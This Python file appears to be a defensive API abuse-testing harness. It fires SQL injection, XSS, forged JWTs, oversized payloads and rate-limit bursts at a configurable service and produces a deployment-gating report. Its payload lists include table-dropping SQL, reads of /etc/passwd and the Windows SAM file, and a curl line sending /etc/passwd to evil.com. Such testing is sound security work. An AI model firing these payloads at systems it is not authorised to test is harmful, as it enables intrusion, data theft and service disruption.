#!/usr/bin/env python3
"""
LUKHAS Abuse Testing Framework
Comprehensive API security testing with attack simulation for T4/0.01% excellence standards.
Tests for injection attacks, authentication bypass, rate limiting, and DoS resistance.
"""

import argparse
import asyncio
import datetime
import json
import sys
import time
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Any, Dict, List, Tuple
from urllib.parse import urljoin

import aiohttp


@dataclass
class AttackResult:
    """Result from an abuse test attack"""
    attack_name: str
    attack_type: str
    target_endpoint: str
    payload: str
    response_code: int
    response_time_ms: float
    response_body: str
    success: bool
    blocked_properly: bool
    details: Dict[str, Any]


@dataclass
class RateLimitTest:
    """Rate limiting test result"""
    endpoint: str
    requests_per_second: int
    total_requests: int
    successful_requests: int
    blocked_requests: int
    average_response_time: float
    rate_limit_triggered: bool


class LUKHASAbuseTestFramework:
    """Comprehensive abuse testing framework"""

    def __init__(self, base_url: str, output_dir: Path):
        self.base_url = base_url.rstrip('/')
        self.output_dir = output_dir
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.timestamp = datetime.datetime.now(datetime.timezone.utc).isoformat()

        self.attack_results: List[AttackResult] = []
        self.rate_limit_results: List[RateLimitTest] = []

        # Common endpoints to test (will be discovered dynamically in production)
        self.test_endpoints = [
            "/api/v1/health",
            "/api/v1/auth/login",
            "/api/v1/auth/token",
            "/api/v1/memory/search",
            "/api/v1/consciousness/process",
            "/api/v1/identity/profile",
            "/oidc/.well-known/openid_configuration",
            "/oidc/auth",
            "/oidc/token",
            "/api/v1/guardian/validate"
        ]

        # Attack payloads
        self.sql_injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "' OR 1=1 #",
            "\"; DROP TABLE users; --"
        ]

        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<svg onload=alert('XSS')>",
            "{{7*7}}",  # Template injection
            "${7*7}",   # Expression injection
        ]

        self.command_injection_payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; curl evil.com/steal?data=$(cat /etc/passwd)"
        ]

        self.path_traversal_payloads = [
            "../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252fetc%252fpasswd"
        ]

        # Authentication bypass patterns
        self.auth_bypass_payloads = [
            {"username": "admin", "password": "admin"},
            {"username": "admin'--", "password": "anything"},
            {"username": "' OR '1'='1", "password": "' OR '1'='1"},
            {"username": "test\"; DROP TABLE users; --", "password": "test"},
        ]

    async def discover_endpoints(self, session: aiohttp.ClientSession) -> List[str]:
        """Discover available endpoints"""
        discovered_endpoints = []

        # Try common discovery endpoints
        discovery_endpoints = [
            "/api",
            "/api/v1",
            "/docs",
            "/openapi.json",
            "/.well-known/openid_configuration",
            "/health",
            "/metrics"
        ]

        for endpoint in discovery_endpoints:
            try:
                url = urljoin(self.base_url, endpoint)
                async with session.get(url, timeout=5) as response:
                    if response.status < 500:  # Found endpoint
                        discovered_endpoints.append(endpoint)
            except Exception:
                continue

        # Combine discovered and predefined endpoints
        all_endpoints = list(set(discovered_endpoints + self.test_endpoints))
        return all_endpoints

    async def test_sql_injection(self, session: aiohttp.ClientSession,
                                endpoint: str) -> List[AttackResult]:
        """Test SQL injection vulnerabilities"""
        results = []

        for payload in self.sql_injection_payloads:
            start_time = time.time()

            try:
                # Test as URL parameter
                url = urljoin(self.base_url, endpoint)
                params = {"q": payload, "search": payload, "id": payload}

                async with session.get(url, params=params, timeout=10) as response:
                    response_time = (time.time() - start_time) * 1000
                    response_text = await response.text()

                    # Check for SQL injection indicators
                    sql_error_patterns = [
                        "sql syntax", "mysql_", "ora-", "postgresql",
                        "sqlite_", "syntax error", "quoted string not properly terminated"
                    ]

                    vulnerable = any(pattern in response_text.lower() for pattern in sql_error_patterns)

                    result = AttackResult(
                        attack_name=f"SQL Injection - {payload[:20]}",
                        attack_type="sql_injection",
                        target_endpoint=endpoint,
                        payload=payload,
                        response_code=response.status,
                        response_time_ms=response_time,
                        response_body=response_text[:500],
                        success=vulnerable,
                        blocked_properly=not vulnerable and response.status in [400, 403, 422],
                        details={
                            "method": "GET",
                            "injection_point": "url_parameters",
                            "error_patterns_detected": [p for p in sql_error_patterns if p in response_text.lower()]
                        }
                    )
                    results.append(result)

                # Test as JSON body
                if endpoint not in ["/health", "/metrics"]:
                    json_payload = {"query": payload, "data": payload, "input": payload}

                    async with session.post(url, json=json_payload, timeout=10) as response:
                        response_time = (time.time() - start_time) * 1000
                        response_text = await response.text()

                        vulnerable = any(pattern in response_text.lower() for pattern in sql_error_patterns)

                        result = AttackResult(
                            attack_name=f"SQL Injection JSON - {payload[:20]}",
                            attack_type="sql_injection",
                            target_endpoint=endpoint,
                            payload=json.dumps(json_payload),
                            response_code=response.status,
                            response_time_ms=response_time,
                            response_body=response_text[:500],
                            success=vulnerable,
                            blocked_properly=not vulnerable and response.status in [400, 403, 422],
                            details={
                                "method": "POST",
                                "injection_point": "json_body",
                                "error_patterns_detected": [p for p in sql_error_patterns if p in response_text.lower()]
                            }
                        )
                        results.append(result)

            except Exception as e:
                # Timeout or connection error - could indicate DoS vulnerability
                result = AttackResult(
                    attack_name=f"SQL Injection - {payload[:20]}",
                    attack_type="sql_injection",
                    target_endpoint=endpoint,
                    payload=payload,
                    response_code=0,
                    response_time_ms=(time.time() - start_time) * 1000,
                    response_body=str(e)[:500],
                    success=False,
                    blocked_properly=True,  # Assume proper blocking if timeout
                    details={"error": str(e), "method": "GET"}
                )
                results.append(result)

        return results

    async def test_xss_vulnerabilities(self, session: aiohttp.ClientSession,
                                     endpoint: str) -> List[AttackResult]:
        """Test Cross-Site Scripting vulnerabilities"""
        results = []

        for payload in self.xss_payloads:
            start_time = time.time()

            try:
                url = urljoin(self.base_url, endpoint)
                params = {"message": payload, "content": payload, "text": payload}

                async with session.get(url, params=params, timeout=10) as response:
                    response_time = (time.time() - start_time) * 1000
                    response_text = await response.text()

                    # Check if payload is reflected without encoding
                    vulnerable = payload in response_text

                    result = AttackResult(
                        attack_name=f"XSS - {payload[:30]}",
                        attack_type="xss",
                        target_endpoint=endpoint,
                        payload=payload,
                        response_code=response.status,
                        response_time_ms=response_time,
                        response_body=response_text[:500],
                        success=vulnerable,
                        blocked_properly=not vulnerable and response.status in [400, 403, 422],
                        details={
                            "method": "GET",
                            "reflection_detected": vulnerable,
                            "content_type": response.headers.get("content-type", "")
                        }
                    )
                    results.append(result)

            except Exception as e:
                result = AttackResult(
                    attack_name=f"XSS - {payload[:30]}",
                    attack_type="xss",
                    target_endpoint=endpoint,
                    payload=payload,
                    response_code=0,
                    response_time_ms=(time.time() - start_time) * 1000,
                    response_body=str(e)[:500],
                    success=False,
                    blocked_properly=True,
                    details={"error": str(e)}
                )
                results.append(result)

        return results

    async def test_authentication_bypass(self, session: aiohttp.ClientSession) -> List[AttackResult]:
        """Test authentication bypass vulnerabilities"""
        results = []

        auth_endpoints = [ep for ep in self.test_endpoints if "auth" in ep or "login" in ep]

        for endpoint in auth_endpoints:
            for bypass_payload in self.auth_bypass_payloads:
                start_time = time.time()

                try:
                    url = urljoin(self.base_url, endpoint)

                    async with session.post(url, json=bypass_payload, timeout=10) as response:
                        response_time = (time.time() - start_time) * 1000
                        response_text = await response.text()

                        # Check for successful authentication indicators
                        success_indicators = ["token", "access_token", "success", "welcome"]
                        vulnerable = (response.status == 200 and
                                    any(indicator in response_text.lower() for indicator in success_indicators))

                        result = AttackResult(
                            attack_name=f"Auth Bypass - {bypass_payload['username']}",
                            attack_type="authentication_bypass",
                            target_endpoint=endpoint,
                            payload=json.dumps(bypass_payload),
                            response_code=response.status,
                            response_time_ms=response_time,
                            response_body=response_text[:500],
                            success=vulnerable,
                            blocked_properly=not vulnerable and response.status in [401, 403, 422],
                            details={
                                "method": "POST",
                                "auth_indicators": [i for i in success_indicators if i in response_text.lower()]
                            }
                        )
                        results.append(result)

                except Exception as e:
                    result = AttackResult(
                        attack_name=f"Auth Bypass - {bypass_payload['username']}",
                        attack_type="authentication_bypass",
                        target_endpoint=endpoint,
                        payload=json.dumps(bypass_payload),
                        response_code=0,
                        response_time_ms=(time.time() - start_time) * 1000,
                        response_body=str(e)[:500],
                        success=False,
                        blocked_properly=True,
                        details={"error": str(e)}
                    )
                    results.append(result)

        return results

    async def test_rate_limiting(self, session: aiohttp.ClientSession,
                                endpoint: str, requests_per_second: int = 100,
                                duration: int = 10) -> RateLimitTest:
        """Test rate limiting effectiveness"""
        print(f"🚀 Testing rate limiting: {endpoint} ({requests_per_second} req/s)")

        url = urljoin(self.base_url, endpoint)
        total_requests = 0
        successful_requests = 0
        blocked_requests = 0
        response_times = []
        rate_limit_triggered = False

        start_time = time.time()
        end_time = start_time + duration

        while time.time() < end_time:
            batch_start = time.time()

            # Send batch of requests
            batch_tasks = []
            for _ in range(requests_per_second):
                task = asyncio.create_task(self._make_request(session, url))
                batch_tasks.append(task)

            # Wait for batch to complete
            batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)

            # Process results
            for result in batch_results:
                total_requests += 1

                if isinstance(result, Exception):
                    blocked_requests += 1
                else:
                    status, response_time = result
                    response_times.append(response_time)

                    if status == 429:  # Too Many Requests
                        blocked_requests += 1
                        rate_limit_triggered = True
                    elif status < 500:  # Successful or client error (but not rate limited)
                        successful_requests += 1
                    else:
                        blocked_requests += 1

            # Sleep to maintain rate
            batch_time = time.time() - batch_start
            if batch_time < 1.0:
                await asyncio.sleep(1.0 - batch_time)

        average_response_time = sum(response_times) / len(response_times) if response_times else 0

        return RateLimitTest(
            endpoint=endpoint,
            requests_per_second=requests_per_second,
            total_requests=total_requests,
            successful_requests=successful_requests,
            blocked_requests=blocked_requests,
            average_response_time=average_response_time,
            rate_limit_triggered=rate_limit_triggered
        )

    async def _make_request(self, session: aiohttp.ClientSession, url: str) -> Tuple[int, float]:
        """Make a single request and return status and response time"""
        start_time = time.time()
        try:
            async with session.get(url, timeout=5) as response:
                response_time = (time.time() - start_time) * 1000
                return response.status, response_time
        except Exception:
            response_time = (time.time() - start_time) * 1000
            return 0, response_time

    async def test_jwt_manipulation(self, session: aiohttp.ClientSession) -> List[AttackResult]:
        """Test JWT token manipulation attacks"""
        results = []

        # Test with manipulated JWT tokens
        malicious_jwts = [
            # None algorithm attack
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.",

            # Manipulated payload (admin user)
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.invalid_signature",

            # Expired token test
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoxfQ.invalid_signature",
        ]

        protected_endpoints = [ep for ep in self.test_endpoints if "api" in ep and ep != "/api/v1/health"]

        for endpoint in protected_endpoints[:3]:  # Test a few endpoints
            for jwt_token in malicious_jwts:
                start_time = time.time()

                try:
                    url = urljoin(self.base_url, endpoint)
                    headers = {"Authorization": f"Bearer {jwt_token}"}

                    async with session.get(url, headers=headers, timeout=10) as response:
                        response_time = (time.time() - start_time) * 1000
                        response_text = await response.text()

                        # Check if access was granted with invalid token
                        vulnerable = response.status == 200

                        result = AttackResult(
                            attack_name=f"JWT Manipulation - {jwt_token[:30]}...",
                            attack_type="jwt_manipulation",
                            target_endpoint=endpoint,
                            payload=jwt_token,
                            response_code=response.status,
                            response_time_ms=response_time,
                            response_body=response_text[:500],
                            success=vulnerable,
                            blocked_properly=not vulnerable and response.status in [401, 403],
                            details={
                                "method": "GET",
                                "auth_header": f"Bearer {jwt_token[:30]}...",
                                "expected_rejection": True
                            }
                        )
                        results.append(result)

                except Exception as e:
                    result = AttackResult(
                        attack_name=f"JWT Manipulation - {jwt_token[:30]}...",
                        attack_type="jwt_manipulation",
                        target_endpoint=endpoint,
                        payload=jwt_token,
                        response_code=0,
                        response_time_ms=(time.time() - start_time) * 1000,
                        response_body=str(e)[:500],
                        success=False,
                        blocked_properly=True,
                        details={"error": str(e)}
                    )
                    results.append(result)

        return results

    async def test_memory_exhaustion(self, session: aiohttp.ClientSession) -> List[AttackResult]:
        """Test memory exhaustion and DoS attacks"""
        results = []

        # Large payload attack
        large_payload = "A" * (10 * 1024 * 1024)  # 10MB payload

        memory_endpoints = [ep for ep in self.test_endpoints if "memory" in ep or "process" in ep]

        for endpoint in memory_endpoints[:2]:  # Limit to avoid actually DoSing the service
            start_time = time.time()

            try:
                url = urljoin(self.base_url, endpoint)
                json_payload = {"data": large_payload, "content": large_payload}

                async with session.post(url, json=json_payload, timeout=30) as response:
                    response_time = (time.time() - start_time) * 1000
                    response_text = await response.text()

                    # Check if server handled large payload gracefully
                    handled_gracefully = response.status in [400, 413, 422, 503]  # Expected error codes

                    result = AttackResult(
                        attack_name="Memory Exhaustion - Large Payload",
                        attack_type="memory_exhaustion",
                        target_endpoint=endpoint,
                        payload=f"Large payload ({len(large_payload)} bytes)",
                        response_code=response.status,
                        response_time_ms=response_time,
                        response_body=response_text[:500],
                        success=not handled_gracefully,
                        blocked_properly=handled_gracefully,
                        details={
                            "method": "POST",
                            "payload_size_bytes": len(large_payload),
                            "response_time_acceptable": response_time < 5000  # 5 seconds max
                        }
                    )
                    results.append(result)

            except Exception as e:
                # Timeout could indicate successful DoS or proper protection
                response_time = (time.time() - start_time) * 1000

                result = AttackResult(
                    attack_name="Memory Exhaustion - Large Payload",
                    attack_type="memory_exhaustion",
                    target_endpoint=endpoint,
                    payload=f"Large payload ({len(large_payload)} bytes)",
                    response_code=0,
                    response_time_ms=response_time,
                    response_body=str(e)[:500],
                    success=False,
                    blocked_properly=True,  # Assume protection if timeout
                    details={
                        "error": str(e),
                        "timeout_protection": response_time > 30000
                    }
                )
                results.append(result)

        return results

    def generate_abuse_test_report(self) -> Dict[str, Any]:
        """Generate comprehensive abuse test report"""

        # Analyze attack results
        total_attacks = len(self.attack_results)
        successful_attacks = sum(1 for attack in self.attack_results if attack.success)
        properly_blocked = sum(1 for attack in self.attack_results if attack.blocked_properly)

        # Categorize attacks
        attack_categories = {}
        for attack in self.attack_results:
            category = attack.attack_type
            if category not in attack_categories:
                attack_categories[category] = {"total": 0, "successful": 0, "blocked": 0}

            attack_categories[category]["total"] += 1
            if attack.success:
                attack_categories[category]["successful"] += 1
            if attack.blocked_properly:
                attack_categories[category]["blocked"] += 1

        # Analyze rate limiting results
        rate_limit_effective = all(test.rate_limit_triggered for test in self.rate_limit_results)

        # Determine overall security posture
        critical_vulnerabilities = sum(1 for attack in self.attack_results
                                     if attack.success and attack.attack_type in
                                     ["sql_injection", "authentication_bypass", "jwt_manipulation"])

        deployment_safe = (
            critical_vulnerabilities == 0 and
            successful_attacks < total_attacks * 0.1 and  # Less than 10% success rate
            rate_limit_effective
        )

        report = {
            "scan_type": "abuse",
            "timestamp": self.timestamp,
            "git_sha": self._get_git_sha(),
            "test_configuration": {
                "base_url": self.base_url,
                "endpoints_tested": len(set(attack.target_endpoint for attack in self.attack_results)),
                "attack_types": list(attack_categories.keys()),
                "total_attacks_performed": total_attacks
            },
            "security_findings": {
                "total_attacks": total_attacks,
                "successful_attacks": successful_attacks,
                "properly_blocked_attacks": properly_blocked,
                "success_rate_percent": (successful_attacks / total_attacks * 100) if total_attacks > 0 else 0,
                "blocking_rate_percent": (properly_blocked / total_attacks * 100) if total_attacks > 0 else 0,
                "critical_vulnerabilities": critical_vulnerabilities
            },
            "attack_categories": attack_categories,
            "rate_limiting_tests": {
                "tests_performed": len(self.rate_limit_results),
                "rate_limiting_effective": rate_limit_effective,
                "average_blocked_percent": sum(
                    test.blocked_requests / test.total_requests * 100
                    for test in self.rate_limit_results
                ) / len(self.rate_limit_results) if self.rate_limit_results else 0
            },
            "compliance_status": {
                "deployment_safe": deployment_safe,
                "critical_vulnerabilities_found": critical_vulnerabilities > 0,
                "rate_limiting_configured": rate_limit_effective,
                "input_validation_effective": attack_categories.get("sql_injection", {}).get("successful", 0) == 0,
                "authentication_secure": attack_categories.get("authentication_bypass", {}).get("successful", 0) == 0,
                "jwt_security_configured": attack_categories.get("jwt_manipulation", {}).get("successful", 0) == 0
            },
            "deployment_readiness": "APPROVED" if deployment_safe else "BLOCKED",
            "recommendations": self._generate_security_recommendations(),
            "detailed_results": {
                "attack_results": [asdict(attack) for attack in self.attack_results],
                "rate_limit_results": [asdict(test) for test in self.rate_limit_results]
            }
        }

        return report

    def _get_git_sha(self) -> str:
        """Get current git SHA"""
        try:
            import subprocess
            result = subprocess.run(["git", "rev-parse", "HEAD"],
                                   capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip()
        except Exception:
            pass
        return "unknown"

    def _generate_security_recommendations(self) -> List[str]:
        """Generate security recommendations based on test results"""
        recommendations = []

        # Check for critical vulnerabilities
        sql_injection_found = any(attack.success and attack.attack_type == "sql_injection"
                                for attack in self.attack_results)
        if sql_injection_found:
            recommendations.append("CRITICAL: SQL injection vulnerabilities found - implement parameterized queries")

        auth_bypass_found = any(attack.success and attack.attack_type == "authentication_bypass"
                              for attack in self.attack_results)
        if auth_bypass_found:
            recommendations.append("CRITICAL: Authentication bypass found - review authentication logic")

        jwt_issues_found = any(attack.success and attack.attack_type == "jwt_manipulation"
                             for attack in self.attack_results)
        if jwt_issues_found:
            recommendations.append("HIGH: JWT security issues found - implement proper token validation")

        # Check rate limiting
        if not all(test.rate_limit_triggered for test in self.rate_limit_results):
            recommendations.append("MEDIUM: Rate limiting not effective on all endpoints - implement rate limiting")

        # General recommendations
        if not recommendations:
            recommendations.append("Security posture is strong - maintain current security practices")

        return recommendations

    async def run_comprehensive_abuse_tests(self) -> Dict[str, Any]:
        """Run comprehensive abuse testing suite"""
        print("🚀 Starting LUKHAS comprehensive abuse testing...")
        print(f"🎯 Target: {self.base_url}")
        print(f"⏰ Timestamp: {self.timestamp}")

        connector = aiohttp.TCPConnector(limit=100, limit_per_host=50)
        timeout = aiohttp.ClientTimeout(total=30, connect=10)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Discover endpoints
            print("🔍 Discovering endpoints...")
            endpoints = await self.discover_endpoints(session)
            print(f"📊 Found {len(endpoints)} endpoints to test")

            # Run attack tests
            print("⚔️  Running SQL injection tests...")
            for endpoint in endpoints[:5]:  # Limit to avoid overwhelming
                sql_results = await self.test_sql_injection(session, endpoint)
                self.attack_results.extend(sql_results)

            print("🕷️  Running XSS tests...")
            for endpoint in endpoints[:5]:
                xss_results = await self.test_xss_vulnerabilities(session, endpoint)
                self.attack_results.extend(xss_results)

            print("🔓 Running authentication bypass tests...")
            auth_results = await self.test_authentication_bypass(session)
            self.attack_results.extend(auth_results)

            print("🎭 Running JWT manipulation tests...")
            jwt_results = await self.test_jwt_manipulation(session)
            self.attack_results.extend(jwt_results)

            print("💥 Running memory exhaustion tests...")
            memory_results = await self.test_memory_exhaustion(session)
            self.attack_results.extend(memory_results)

            # Run rate limiting tests
            print("🚦 Running rate limiting tests...")
            for endpoint in endpoints[:3]:  # Test key endpoints
                rate_limit_result = await self.test_rate_limiting(session, endpoint, 50, 5)
                self.rate_limit_results.append(rate_limit_result)

        # Generate report
        report = self.generate_abuse_test_report()

        # Save report
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = self.output_dir / f"abuse-test-{timestamp}.json"

        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)

        print("\n📊 Abuse Test Results:")
        print(f"   Total Attacks: {len(self.attack_results)}")
        print(f"   Successful Attacks: {sum(1 for a in self.attack_results if a.success)}")
        print(f"   Critical Vulnerabilities: {sum(1 for a in self.attack_results if a.success and a.attack_type in ['sql_injection', 'authentication_bypass'])}")
        print(f"   Rate Limiting Effective: {'✅' if all(t.rate_limit_triggered for t in self.rate_limit_results) else '❌'}")
        print(f"   Deployment Status: {report['deployment_readiness']}")
        print(f"💾 Report saved to: {report_file}")

        return report


def main():
    parser = argparse.ArgumentParser(description="Run LUKHAS abuse testing")
    parser.add_argument("--base-url", default="http://localhost:8000",
                       help="Base URL of the application to test")
    parser.add_argument("--output-dir", default="artifacts",
                       help="Output directory for reports")

    args = parser.parse_args()

    output_dir = Path(args.output_dir)
    tester = LUKHASAbuseTestFramework(args.base_url, output_dir)

    try:
        report = asyncio.run(tester.run_comprehensive_abuse_tests())

        if report["deployment_readiness"] == "BLOCKED":
            print("\n❌ ABUSE TESTING FAILED: Critical security vulnerabilities detected")
            print("   Review findings and fix vulnerabilities before deployment")
            sys.exit(1)
        else:
            print("\n✅ ABUSE TESTING PASSED: No critical vulnerabilities detected")

    except Exception as e:
        print(f"❌ Abuse testing failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
